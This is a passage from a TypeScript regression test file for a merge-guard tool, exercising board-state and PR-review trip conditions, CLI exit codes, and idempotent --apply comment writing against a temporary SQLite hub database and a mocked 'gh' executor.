// LOOP-67 regression: merge-guard board-state axis must trip when the PR's ticket is In Review,
// Canceled, or Duplicate; pass on Todo/In Progress; and skip (no false trip) when no hub DB is present.
// Design: merge-review-guard §3.3 + §8-Child4.
// LOOP-65 regression: merge-guard --apply path writes objection comment + routes ticket on trip;
// read path (no --apply) writes nothing; no-DB degrades silently; idempotent on re-run.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { openDb, isToolWriteEventData } from "../src/db.ts";
// LOOP-300 regression: a --strict run that evaluated NEITHER axis must not report a clean pass,
// while a genuine outage still degrades to one (§3.4). skipClass/unevaluatedHold are the classifier
// the distinction rests on; registryGhRepos is the cwd-independent repo resolution (AC3).
import { mergeGuard, skipClass, unevaluatedHold, registryGhRepos } from "../src/merge-guard.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string): void => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const ROOT = mkdtempSync(join(tmpdir(), "dl-merge-guard-"));
try {
  // ── Fixture: hub.db with tickets in each board state ──────────────────────────
  const dbPath = join(ROOT, "hub.db");
  const conn = openDb(dbPath);
  conn.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  const tk = (id: string, state: string, assignee: string | null = null): void => {
    conn.prepare("INSERT INTO tickets(id,project_id,title,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,?,0,'[]','[]','pm','t','t')").run(id, "p", "t-" + id, state, assignee);
  };
  tk("MG-1", "Todo");
  tk("MG-2", "In Progress");
  tk("MG-3", "In Review");
  tk("MG-4", "Canceled");
  tk("MG-5", "Duplicate");
  // LOOP-65 --apply fixtures: fresh tickets to avoid state pollution from other tests
  tk("MG-6", "In Progress", "senior-dev"); // forge review trip + --apply
  tk("MG-7", "In Review", "senior-dev");   // board-state trip + --apply
  tk("MG-8", "In Progress"); // no-trip path + --apply (should NOT write)
  tk("MG-9", "In Review");   // idempotency: second --apply must not dup comment
  tk("MG-10", "In Review");  // LOOP-130: re-apply-after-external-unblock
  tk("MG-11", "In Review");  // LOOP-216: merged-PR check → skipped_merged (AC1)
  tk("MG-12", "In Review"); // LOOP-218 actor attribution — DEVLOOP_ACTOR set case
  tk("MG-13", "In Review"); // LOOP-218 actor attribution — DEVLOOP_ACTOR unset case

  conn.close();

  // A fake repo dir so resolveHubDbPath has something to look at (we pass dbPath explicitly)
  const repoDir = join(ROOT, "repo");
  mkdirSync(repoDir);
  writeFileSync(join(repoDir, ".git"), "");  // stub — not a real git repo, but we pass dbPath explicitly

  // ── AC: Todo/In Progress → no trip ───────────────────────────────────────────
  const rTodo = mergeGuard(repoDir, { ticketId: "MG-1", dbPath });
  ok(!rTodo.trip, "Todo ticket → no trip");
  ok(rTodo.boardState.ticketState === "Todo", "Todo: state reported correctly");
  ok(!rTodo.boardState.skipped, "Todo: axis was evaluated (not skipped)");

  const rInProgress = mergeGuard(repoDir, { ticketId: "MG-2", dbPath });
  ok(!rInProgress.trip, "In Progress ticket → no trip");
  ok(rInProgress.boardState.ticketState === "In Progress", "In Progress: state reported correctly");

  // ── AC: In Review → trip ─────────────────────────────────────────────────────
  const rInReview = mergeGuard(repoDir, { ticketId: "MG-3", dbPath });
  ok(rInReview.trip, "In Review ticket → trip");
  ok(rInReview.boardState.trip === rInReview.trip, "boardState.trip consistent with result.trip");
  ok(rInReview.boardState.ticketState === "In Review", "In Review: state reported correctly");

  // ── AC: Canceled → trip ───────────────────────────────────────────────────────
  const rCanceled = mergeGuard(repoDir, { ticketId: "MG-4", dbPath });
  ok(rCanceled.trip, "Canceled ticket → trip");
  ok(rCanceled.boardState.ticketState === "Canceled", "Canceled: state reported correctly");

  // ── AC: Duplicate → trip ──────────────────────────────────────────────────────
  const rDuplicate = mergeGuard(repoDir, { ticketId: "MG-5", dbPath });
  ok(rDuplicate.trip, "Duplicate ticket → trip");
  ok(rDuplicate.boardState.ticketState === "Duplicate", "Duplicate: state reported correctly");

  // ── AC: no hub DB → axis skipped (no false trip) ─────────────────────────────
  const rNoDb = mergeGuard(repoDir, { ticketId: "MG-3", dbPath: join(ROOT, "nonexistent.db") });
  ok(!rNoDb.trip, "no hub DB → no trip (axis skipped, no false positive)");
  ok(rNoDb.boardState.skipped, "no hub DB → skipped=true");

  // ── AC: unknown ticket (not in hub) → no trip ────────────────────────────────
  const rUnknown = mergeGuard(repoDir, { ticketId: "MG-999", dbPath });
  ok(!rUnknown.trip, "unknown ticket → no trip (fail-open for unknown)");
  ok(!rUnknown.boardState.skipped, "unknown ticket: axis evaluated");
  ok(rUnknown.boardState.ticketState === null, "unknown ticket: state is null");

  // ── AC: no ticketId provided → no trip ───────────────────────────────────────
  const rNoTicket = mergeGuard(repoDir, { dbPath });
  ok(!rNoTicket.trip, "no ticketId, no inferrable branch → no trip");
  ok(!rNoTicket.boardState.trip, "no ticketId: boardState.trip=false");

  // ── CLI tests ─────────────────────────────────────────────────────────────────
  const cli = (args: string[], env?: Record<string, string>): { status: number; stdout: string; stderr: string } => {
    const r = spawnSync(process.execPath, [join(hubRoot, "src", "merge-guard.ts"), ...args], {
      encoding: "utf8",
      env: { ...process.env, ...env },
    });
    return { status: r.status ?? 1, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
  };

  // CLI advisory (no --strict): exit 0 even when tripped
  const cliInReview = cli(["--repo", repoDir, "--ticket", "MG-3"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliInReview.status === 0, "CLI advisory: In Review → exit 0 (no --strict)");
  ok(/TRIP|In Review/.test(cliInReview.stderr), `CLI: trip message on stderr for In Review (got: ${cliInReview.stderr.trim().slice(0, 100)})`);

  // CLI --strict: exit 1 on trip
  const cliStrict = cli(["--repo", repoDir, "--ticket", "MG-3", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliStrict.status === 1, "CLI --strict: In Review → exit 1");

  // CLI --strict: exit 0 on Todo
  const cliStrictClean = cli(["--repo", repoDir, "--ticket", "MG-1", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliStrictClean.status === 0, "CLI --strict: Todo → exit 0 (merge-eligible)");
  ok(/merge-eligible/.test(cliStrictClean.stdout), `CLI: merge-eligible message for Todo (got: ${cliStrictClean.stdout.trim()})`);

  // CLI: no hub DB → exits 0 (skipped, no false trip)
  const cliNoDb = cli(["--repo", repoDir, "--ticket", "MG-3", "--strict"], { DEVLOOP_HUB_DB: join(ROOT, "no.db") });
  ok(cliNoDb.status === 0, "CLI: no hub DB + --strict → exit 0 (skipped, never a false trip)");
  ok(/skipped/.test(cliNoDb.stdout), "CLI: no hub DB mentions 'skipped'");

  // CLI --json: valid JSON output
  const cliJson = cli(["--repo", repoDir, "--ticket", "MG-3", "--json"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliJson.status === 0, "CLI --json: exits 0 (advisory)");
  let parsed: { trip?: boolean; boardState?: { ticketState?: string } } = {};
  try { parsed = JSON.parse(cliJson.stdout); } catch { ok(false, "CLI --json: output is valid JSON"); }
  ok(parsed.trip === true, `CLI --json: trip=true for In Review (got: ${JSON.stringify(parsed)})`);
  ok(parsed.boardState?.ticketState === "In Review", "CLI --json: boardState.ticketState='In Review'");

  // CLI Canceled --strict
  const cliCanceled = cli(["--repo", repoDir, "--ticket", "MG-4", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliCanceled.status === 1, "CLI --strict: Canceled → exit 1");

  // CLI Duplicate --strict
  const cliDuplicate = cli(["--repo", repoDir, "--ticket", "MG-5", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliDuplicate.status === 1, "CLI --strict: Duplicate → exit 1");

  // CLI In Progress --strict → exit 0 (merge-eligible)
  const cliInProgress = cli(["--repo", repoDir, "--ticket", "MG-2", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliInProgress.status === 0, "CLI --strict: In Progress → exit 0");

  // ── Forge review axis (Child 1 / LOOP-64) — unit tests with injected exec ──
  // All tests use a fixed ghRepo and injected exec returning canned gh JSON.
  // No real gh calls are made; no network access.

  type ExecFn = (args: string[]) => { stdout: string; stderr: string; ok: boolean };

  const PR_URL = "https://github.com/owner/repo/pull/42";
  const GHREPO = "owner/repo";

  // Build a canned exec that returns different responses for pr view vs graphql
  const makePrExec = (prData: object, gqlData?: object | "fail"): ExecFn => {
    return (args: string[]) => {
      if (args[0] === "pr" && args[1] === "view") {
        return { ok: true, stdout: JSON.stringify(prData), stderr: "" };
      }
      if (args[0] === "api" && args[1] === "graphql") {
        if (gqlData === "fail" || !gqlData) return { ok: false, stdout: "", stderr: "graphql failed" };
        return { ok: true, stdout: JSON.stringify(gqlData), stderr: "" };
      }
      return { ok: false, stdout: "", stderr: "unexpected gh call" };
    };
  };

  const prChangesRequested = { number: 42, reviewDecision: "CHANGES_REQUESTED", url: PR_URL, latestReviews: [{ author: { login: "alice" }, state: "CHANGES_REQUESTED" }] };
  const prApproved = { number: 42, reviewDecision: "APPROVED", url: PR_URL, latestReviews: [{ author: { login: "alice" }, state: "APPROVED" }] };
  const prEmpty = { number: 42, reviewDecision: "", url: PR_URL, latestReviews: [] };

  const gqlUnresolvedThread = (login: string) => ({
    data: { repository: { pullRequest: { reviewThreads: { nodes: [
      { isResolved: false, comments: { nodes: [{ author: { login } }] } },
    ] } } } },
  });
  const gqlNoThreads = { data: { repository: { pullRequest: { reviewThreads: { nodes: [] } } } } };

  // AC1: non-agent CHANGES_REQUESTED → trip
  const rCR = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prChangesRequested, gqlNoThreads) });
  ok(rCR.forgeReview.trip, "forge: CHANGES_REQUESTED from non-agent → trip");
  ok(rCR.forgeReview.changeRequesters.includes("alice"), "forge: changeRequesters includes alice");
  ok(!rCR.forgeReview.skipped, "forge: CHANGES_REQUESTED — axis was evaluated");
  ok(rCR.trip, "forge: overall trip=true when forgeReview trips");

  // AC1: APPROVED → no trip
  const rApproved = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prApproved, gqlNoThreads) });
  ok(!rApproved.forgeReview.trip, "forge: APPROVED → no trip");
  ok(!rApproved.trip, "forge: APPROVED → overall trip=false");

  // AC1: empty reviewDecision, no threads → no trip
  const rEmpty = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prEmpty, gqlNoThreads) });
  ok(!rEmpty.forgeReview.trip, "forge: empty reviewDecision + no threads → no trip");
  ok(!rEmpty.forgeReview.skipped, "forge: empty reviewDecision — axis evaluated");

  // AC1: unresolved thread from non-agent → trip even when reviewDecision is ""
  const rThread = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prEmpty, gqlUnresolvedThread("bob")) });
  ok(rThread.forgeReview.trip, "forge: unresolved thread from non-agent → trip");
  ok(rThread.forgeReview.unresolvedThreadAuthors.includes("bob"), "forge: unresolvedThreadAuthors includes bob");

  // AC2: agent-login review → no trip (agent reviews are excluded)
  const rAgentCR = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: ["alice"], exec: makePrExec(prChangesRequested, gqlNoThreads) });
  ok(!rAgentCR.forgeReview.trip, "forge: CHANGES_REQUESTED by agent login → no trip (AC2)");
  ok(!rAgentCR.trip, "forge: agent review → overall trip=false");

  // AC2: agent thread author → no trip
  const rAgentThread = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: ["bob"], exec: makePrExec(prEmpty, gqlUnresolvedThread("bob")) });
  ok(!rAgentThread.forgeReview.trip, "forge: unresolved thread by agent login → no trip (AC2)");

  // AC5: gh exec throws (ENOENT — gh not on PATH) → skip, no trip
  const rEnoent = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: () => { throw Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }); } });
  ok(!rEnoent.forgeReview.trip, "forge: exec throws ENOENT → no trip (degrade, AC5)");
  ok(rEnoent.forgeReview.skipped, "forge: exec throws → skipped=true");

  // AC5: exec returns ok:false (unauth/offline) → skip, no trip
  const rUnauth = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: () => ({ ok: false, stdout: "", stderr: "gh: not logged in" }) });
  ok(!rUnauth.forgeReview.trip, "forge: gh returns ok:false → no trip (degrade, AC5)");
  ok(rUnauth.forgeReview.skipped, "forge: gh not-ok → skipped=true");

  // AC5: graphql failure degrades thread sub-signal but still honours reviewDecision
  const rGqlFail = mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prChangesRequested, "fail") });
  ok(rGqlFail.forgeReview.trip, "forge: graphql fails but CHANGES_REQUESTED still trips (§3.4 partial degrade)");
  ok(rGqlFail.forgeReview.unresolvedThreadAuthors.length === 0, "forge: graphql fail → empty unresolvedThreadAuthors");

  // AC5: no PR provided → forge axis skipped (not a false trip)
  const rNoPr = mergeGuard(repoDir, { ghRepo: GHREPO, agentReviewers: [] });
  ok(!rNoPr.forgeReview.trip, "forge: no --pr → no trip");
  ok(rNoPr.forgeReview.skipped, "forge: no --pr → skipped=true");

  // AC5: non-GitHub remote → forge axis skipped
  const rNonGh = mergeGuard(repoDir, { pr: 42, ghRepo: undefined, agentReviewers: [], exec: makePrExec(prChangesRequested) });
  // repoDir has no real git remote → resolveGhRepo returns null → skipped
  ok(rNonGh.forgeReview.skipped, "forge: no resolvable ghRepo → skipped (non-GitHub remote, AC5)");

  // Assert no path throws (all paths return, never throw)
  const noThrowPaths = [
    () => mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prChangesRequested) }),
    () => mergeGuard(repoDir, { pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: () => { throw new Error("forced"); } }),
    () => mergeGuard(repoDir, { pr: "branch-name", ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prApproved) }),
    () => mergeGuard(repoDir, {}),
  ];
  let noThrowOk = true;
  for (const fn of noThrowPaths) {
    try { fn(); } catch { noThrowOk = false; }
  }
  ok(noThrowOk, "forge: no path throws (all failures return, AC5)");

  // ── LOOP-65: --apply path (§5.1 / Child 2) ───────────────────────────────────

  // Helper: read current ticket row from the hub DB
  const readTicket = (id: string): { state: string; assignee: string | null; labels: string[] } | undefined => {
    const db = openDb(dbPath);
    try {
      const row = db.prepare("SELECT state,assignee,labels FROM tickets WHERE id=?").get(id) as
        { state: string; assignee: string | null; labels: string } | undefined;
      if (!row) return undefined;
      return { state: row.state, assignee: row.assignee, labels: JSON.parse(row.labels) as string[] };
    } finally { db.close(); }
  };
  const readComments = (id: string): string[] => {
    const db = openDb(dbPath);
    try {
      return (db.prepare("SELECT body FROM comments WHERE ticket_id=? ORDER BY created_at").all(id) as { body: string }[])
        .map((r) => r.body);
    } finally { db.close(); }
  };

  // AC: WITHOUT --apply the read path writes nothing (Child-1 default unchanged)
  const rNoApplyForge = mergeGuard(repoDir, {
    ticketId: "MG-6", dbPath, pr: 42, ghRepo: GHREPO, agentReviewers: [],
    exec: makePrExec(prChangesRequested, gqlNoThreads),
  });
  ok(rNoApplyForge.trip, "apply: forge trip detected (setup check)");
  ok(rNoApplyForge.applied === undefined, "apply: no --apply → applied field absent (read path is pure)");
  ok(readComments("MG-6").length === 0, "apply: no --apply → no comment written to hub");
  const rowAfterNoApply = readTicket("MG-6");
  ok(rowAfterNoApply?.state === "In Progress", "apply: no --apply → ticket state unchanged");

  // AC: forge review trip + --apply → comment posted, ticket routed to Todo with assignee preserved
  const rApplyForge = mergeGuard(repoDir, {
    ticketId: "MG-6", dbPath, pr: 42, ghRepo: GHREPO, agentReviewers: [],
    exec: makePrExec(prChangesRequested, gqlNoThreads),
    apply: true,
  });
  ok(rApplyForge.trip, "apply: forge trip (pre-check)");
  ok(rApplyForge.applied?.action === "wrote", `apply: forge trip + --apply → action=wrote (got: ${rApplyForge.applied?.action})`);
  ok(rApplyForge.applied?.commentBody?.includes("⛔ merge-guard:") ?? false, "apply: comment body includes marker");
  ok(rApplyForge.applied?.commentBody?.includes("@alice") ?? false, "apply: comment body includes reviewer login");
  ok(rApplyForge.applied?.commentBody?.includes("CHANGES_REQUESTED") ?? false, "apply: comment body mentions CHANGES_REQUESTED");
  ok(rApplyForge.applied?.commentBody?.includes("#42") ?? false, "apply: comment body includes PR number");
  const mg6Comments = readComments("MG-6");
  ok(mg6Comments.length === 1, `apply: exactly one comment written (got ${mg6Comments.length})`);
  const mg6Row = readTicket("MG-6");
  ok(mg6Row?.state === "Todo", `apply: forge trip ticket moved to Todo (got: ${mg6Row?.state})`);
  ok(!mg6Row?.labels.includes("blocked"), "apply: forge trip — 'blocked' NOT added (AC3)");
  ok(mg6Row?.assignee === "senior-dev", "apply: forge trip — assignee preserved (senior-dev from setup) (AC3)");

  // AC: idempotent — re-running --apply with same trip does not duplicate the comment
  const rApplyForge2 = mergeGuard(repoDir, {
    ticketId: "MG-6", dbPath, pr: 42, ghRepo: GHREPO, agentReviewers: [],
    exec: makePrExec(prChangesRequested, gqlNoThreads),
    apply: true,
  });
  ok(rApplyForge2.applied?.action === "already_present", `apply: second run → action=already_present (got: ${rApplyForge2.applied?.action})`);
  ok(readComments("MG-6").length === 1, "apply: idempotent — still exactly one comment after second run");

  // AC: board-state trip (In Review) + --apply → comment posted, ticket routed
  const rApplyBoard = mergeGuard(repoDir, { ticketId: "MG-7", dbPath, apply: true });
  ok(rApplyBoard.trip, "apply: board-state trip (In Review) detected");
  ok(rApplyBoard.applied?.action === "wrote", `apply: board trip + --apply → action=wrote (got: ${rApplyBoard.applied?.action})`);
  ok(rApplyBoard.applied?.commentBody?.includes("⛔ merge-guard:") ?? false, "apply: board trip comment includes marker");
  ok(rApplyBoard.applied?.commentBody?.includes("In Review") ?? false, "apply: board trip comment mentions ticket state");
  const mg7Row = readTicket("MG-7");
  ok(mg7Row?.state === "In Review", `apply: board trip — state unchanged (got: ${mg7Row?.state}) (AC2)`);
  ok(!mg7Row?.labels.includes("blocked"), "apply: board trip — 'blocked' NOT added (AC2)");
  ok(mg7Row?.assignee === "senior-dev", "apply: board trip — assignee preserved (AC2)");

  // AC: no trip + --apply → no board write (guard not tripped)
  const rApplyNoTrip = mergeGuard(repoDir, { ticketId: "MG-8", dbPath, apply: true });
  ok(!rApplyNoTrip.trip, "apply: no trip (In Progress) — setup check");
  ok(rApplyNoTrip.applied === undefined, "apply: no trip → applied field absent (no write needed)");
  ok(readComments("MG-8").length === 0, "apply: no trip → no comment written");

  // AC: no hub DB + --apply → skipped_no_db, no throw
  let applyNoDbOk = true;
  let applyNoDbResult: { applied?: { action: string } } = {};
  try {
    applyNoDbResult = mergeGuard(repoDir, {
      ticketId: "MG-7", dbPath: join(ROOT, "absent.db"), apply: true,
      pr: 42, ghRepo: GHREPO, agentReviewers: [], exec: makePrExec(prChangesRequested, gqlNoThreads),
    });
  } catch { applyNoDbOk = false; }
  ok(applyNoDbOk, "apply: no hub DB + --apply → no throw (degrade)");
  ok(applyNoDbResult.applied?.action === "skipped_no_db", `apply: no hub DB → action=skipped_no_db (got: ${applyNoDbResult.applied?.action})`);

  // AC: CLI --apply on tripped ticket writes comment and prints confirmation
  const cliApply = cli(["--repo", repoDir, "--ticket", "MG-9", "--apply", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliApply.status === 1, "CLI --apply --strict: In Review → exit 1");
  ok(/--apply wrote/.test(cliApply.stdout), `CLI --apply: stdout mentions '--apply wrote' (got: ${cliApply.stdout.trim().slice(0, 200)})`);
  ok(readComments("MG-9").length === 1, "CLI --apply: comment written to hub");
  const mg9Row = readTicket("MG-9");
  ok(mg9Row?.state === "In Review", `CLI --apply: board trip — state unchanged (got: ${mg9Row?.state}) (AC2)`);
  ok(!mg9Row?.labels.includes("blocked"), "CLI --apply: board trip — 'blocked' NOT added (AC2)");

  // AC: CLI without --apply on tripped ticket → no comment written
  const cliNoApplyCli = cli(["--repo", repoDir, "--ticket", "MG-3", "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliNoApplyCli.status === 1, "CLI no --apply --strict: In Review → exit 1");
  ok(readComments("MG-3").length === 0, "CLI: no --apply → no comment written to hub (read path pure)");

  // ── LOOP-142: Board-state axis resolved from PR head branch ──────────────────
  // Regression: `merge-guard --pr <n> --strict` from the default branch (or any
  // worktree whose local branch != the PR branch) must resolve the PR's ticket
  // via `gh pr view <n> --json headRefName` and apply the board-state gate to it.
  // Previously the PR head was never consulted — the gate was permanently inert on
  // the fire-start merge pass (Step 0.5) invoked from the default branch.

  // Fixture: PR 90 whose head branch is dev-loop/MG-3 (In Review — should trip)
  const prInReviewHead = {
    number: 90,
    headRefName: "dev-loop/MG-3",
    reviewDecision: "",
    latestReviews: [],
    url: "https://github.com/owner/repo/pull/90",
  };

  // AC1: from default branch (no dev-loop/* branch), --pr resolves PR's head ticket
  // repoDir has a stub .git file → local branch inference always fails → falls to PR head
  const rL142Ac1 = mergeGuard(repoDir, {
    pr: 90, ghRepo: GHREPO, dbPath, agentReviewers: [],
    exec: makePrExec(prInReviewHead, gqlNoThreads),
  });
  ok(rL142Ac1.boardState.ticketId === "MG-3", "LOOP-142 AC1: PR head branch resolves ticket MG-3");
  ok(rL142Ac1.trip, "LOOP-142 AC1: MG-3 (In Review) via PR head → trip");
  ok(!rL142Ac1.boardState.skipped, "LOOP-142 AC1: board axis was evaluated (not skipped)");

  // AC2: invoked from a worktree on dev-loop/MG-1 (Todo) — PR head (MG-3, In Review) must win
  // Without the fix: local branch resolves MG-1 → no trip. With the fix: PR head resolves MG-3 → trip.
  const wtRepo = join(ROOT, "wt-repo");
  mkdirSync(wtRepo);
  spawnSync("git", ["-C", wtRepo, "init", "-q"], { encoding: "utf8" });
  spawnSync("git", ["-C", wtRepo, "checkout", "-b", "dev-loop/MG-1"], { encoding: "utf8" });
  const rL142Ac2 = mergeGuard(wtRepo, {
    pr: 90, ghRepo: GHREPO, dbPath, agentReviewers: [],
    exec: makePrExec(prInReviewHead, gqlNoThreads),
  });
  ok(rL142Ac2.boardState.ticketId === "MG-3", "LOOP-142 AC2: PR head (MG-3) wins over local branch (MG-1)");
  ok(rL142Ac2.trip, "LOOP-142 AC2: MG-3 In Review via PR head → trip, not MG-1 Todo");

  // AC3: explicit --ticket always wins over PR head resolution
  const rL142Ac3 = mergeGuard(repoDir, {
    ticketId: "MG-1", pr: 90, ghRepo: GHREPO, dbPath, agentReviewers: [],
    exec: makePrExec(prInReviewHead, gqlNoThreads),
  });
  ok(rL142Ac3.boardState.ticketId === "MG-1", "LOOP-142 AC3: explicit --ticket MG-1 overrides PR head MG-3");
  ok(!rL142Ac3.trip, "LOOP-142 AC3: explicit MG-1 (Todo) → no trip");
  ok(!rL142Ac3.boardState.skipped, "LOOP-142 AC3: explicit ticket → axis evaluated");

  // AC4: gh exec throws (ENOENT) → degrade, board axis skipped, no false trip
  const rL142Ac4 = mergeGuard(repoDir, {
    pr: 90, ghRepo: GHREPO, dbPath, agentReviewers: [],
    exec: () => { throw Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }); },
  });
  ok(!rL142Ac4.trip, "LOOP-142 AC4: gh unavailable → no trip (degrade)");
  ok(rL142Ac4.boardState.skipped, "LOOP-142 AC4: gh unavailable → board axis skipped");

  // AC5: "No ticket resolved" → boardState.skipped=true (distinguishable from "checked clean")
  // repoDir has a stub .git → no local branch inference. No --pr → no PR head resolution.
  const rL142Ac5None = mergeGuard(repoDir, { dbPath });
  ok(rL142Ac5None.boardState.skipped, "LOOP-142 AC5: no ticket, no PR → skipped=true (not 'clean')");
  ok(rL142Ac5None.boardState.ticketId === null, "LOOP-142 AC5: no ticket → ticketId=null");
  ok(!rL142Ac5None.trip, "LOOP-142 AC5: no ticket → no trip");

  // AC5: "Checked clean" → boardState.skipped=false (distinguishable from skipped)
  const rL142Ac5Clean = mergeGuard(repoDir, { ticketId: "MG-1", dbPath });
  ok(!rL142Ac5Clean.boardState.skipped, "LOOP-142 AC5: explicit ticket checked clean → skipped=false");
  ok(rL142Ac5Clean.boardState.ticketId === "MG-1", "LOOP-142 AC5: clean → ticketId preserved in result");

  // CLI: no --ticket, no --pr → board axis skipped, message includes 'skipped'.
  // EXIT CODE SUPERSEDED BY LOOP-300 (deliberate, not a weakened assertion): this arm used to assert
  // exit 0, which is precisely the defect LOOP-300 files — a --strict run that evaluated NEITHER axis
  // reported the same exit code as one that evaluated both and found them clean, and §12c makes that
  // exit code the machine gate on every feature-PR squash. LOOP-142's own AC5 was about the RESULT
  // being distinguishable (`boardState.skipped=false` when checked clean — still asserted above); the
  // exit-0 expectation here was an incidental encoding of the behaviour, not LOOP-142's requirement.
  // Both halves of LOOP-142's actual intent are preserved: the axis still reports skipped, and the
  // message still says so.
  const cliL142NoInput = cli(["--repo", repoDir, "--strict"], { DEVLOOP_HUB_DB: dbPath });
  ok(cliL142NoInput.status === 3, `LOOP-300: no --ticket no --pr --strict → exit 3 (gated nothing; was exit 0 pre-fix) (got ${cliL142NoInput.status})`);
  ok(/skipped/.test(cliL142NoInput.stdout), `LOOP-142 CLI: no ticket → mentions 'skipped' (got: ${cliL142NoInput.stdout.trim().slice(0, 120)})`);

  // ── LOOP-130: re-apply-after-external-unblock — comment dedup across repeated fires ──
  // Scenario: board-state trip (In Review) fires twice. Under AC2, board trips post the comment
  // but leave the state alone. The second fire must not duplicate the comment.

  // Step 1: initial trip — comment posted, board state unchanged (AC2)
  const rL130First = mergeGuard(repoDir, { ticketId: "MG-10", dbPath, apply: true });
  ok(rL130First.trip, "LOOP-130: initial trip detected (In Review)");
  ok(rL130First.applied?.action === "wrote", `LOOP-130: first --apply → action=wrote (got: ${rL130First.applied?.action})`);
  ok(readComments("MG-10").length === 1, "LOOP-130: first --apply posted exactly one comment");
  const mg10RowFirst = readTicket("MG-10");
  ok(mg10RowFirst?.state === "In Review", `LOOP-130: first --apply (board trip) — state unchanged (got: ${mg10RowFirst?.state}) (AC2)`);
  ok(!mg10RowFirst?.labels.includes("blocked"), "LOOP-130: first --apply (board trip) — 'blocked' NOT added (AC2)");

  // Step 2: no-op reset — ticket already In Review (AC2 never changed it); clears any stale labels
  {
    const db2 = openDb(dbPath);
    db2.prepare("UPDATE tickets SET state='In Review', labels='[]', assignee=NULL WHERE id='MG-10'").run();
    db2.close();
  }
  const mg10RowReverted = readTicket("MG-10");
  ok(mg10RowReverted?.state === "In Review", "LOOP-130: state still In Review after step 2 (setup check)");

  // Step 3: second --apply — comment must NOT be duplicated
  const rL130Second = mergeGuard(repoDir, { ticketId: "MG-10", dbPath, apply: true });
  ok(rL130Second.trip, "LOOP-130: second call still trips (In Review)");
  ok(rL130Second.applied?.action === "already_present", `LOOP-130: second --apply → action=already_present (no dup comment) (got: ${rL130Second.applied?.action})`);
  ok(readComments("MG-10").length === 1, "LOOP-130: comment count still 1 — no duplicate post");
  const mg10RowSecond = readTicket("MG-10");
  ok(mg10RowSecond?.state === "In Review", `LOOP-130: second --apply (board trip) — state unchanged (got: ${mg10RowSecond?.state}) (AC2)`);
  ok(!mg10RowSecond?.labels.includes("blocked"), "LOOP-130: second --apply (board trip) — 'blocked' still absent (AC2)");

  // ── LOOP-216: merged-PR check — skipped_merged short-circuit (AC1) ──────────────────────────────
  // When the PR is already MERGED, applyTrip must not fire — the guard should
  // return action="skipped_merged" and leave the board state untouched.
  // The makePrExec factory returns prData for ALL pr-view calls (both the forge
  // review fetch and the new merged-state check). Adding state:"MERGED" to the
  // prData makes both calls respond with the merged flag.
  const prMergedData = { number: 99, reviewDecision: "", url: PR_URL, latestReviews: [], state: "MERGED" };
  const rMerged = mergeGuard(repoDir, {
    ticketId: "MG-11", dbPath, pr: 99, ghRepo: GHREPO, agentReviewers: [],
    exec: makePrExec(prMergedData, gqlNoThreads),
    apply: true,
  });
  ok(rMerged.trip, "LOOP-216 AC1: In Review ticket trips board-state axis");
  ok(rMerged.applied?.action === "skipped_merged", `LOOP-216 AC1: merged PR → action=skipped_merged (got: ${rMerged.applied?.action})`);
  // No board write: ticket must still be In Review
  const mg11Row = readTicket("MG-11");
  ok(mg11Row?.state === "In Review", `LOOP-216 AC1: merged PR — board state unchanged (got: ${mg11Row?.state})`);
  ok(readComments("MG-11").length === 0, "LOOP-216 AC1: merged PR — no comment written");

  // AC4: prMerged=null (gh unavailable) → also skipped_merged (conservative: don't write if unsure)
  const rMergedGhFail = mergeGuard(repoDir, {
    ticketId: "MG-11", dbPath, pr: 99, ghRepo: GHREPO, agentReviewers: [],
    exec: () => { throw Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }); },
    apply: true,
  });
  ok(rMergedGhFail.trip, "LOOP-216 AC4: In Review still trips when gh unavailable");
  ok(rMergedGhFail.applied?.action === "skipped_merged", `LOOP-216 AC4: gh unavailable → skipped_merged (got: ${rMergedGhFail.applied?.action})`);
  ok(readComments("MG-11").length === 0, "LOOP-216 AC4: gh unavailable — still no comment written");

  // ── LOOP-123 regression: agentReviewers read from workspace config (not just injected opts) ─────
  // Verify the full path: `team set team.agentReviewers` writes config → merge-guard reads it without
  // any opts.agentReviewers injection → the agent reviewer's CHANGES_REQUESTED is excluded.
  const wsDir = mkdtempSync(join(tmpdir(), "dl-mg-ws-"));
  try {
    // 1. Minimal valid service workspace (hand-created for setup; agentReviewers written by mutator below)
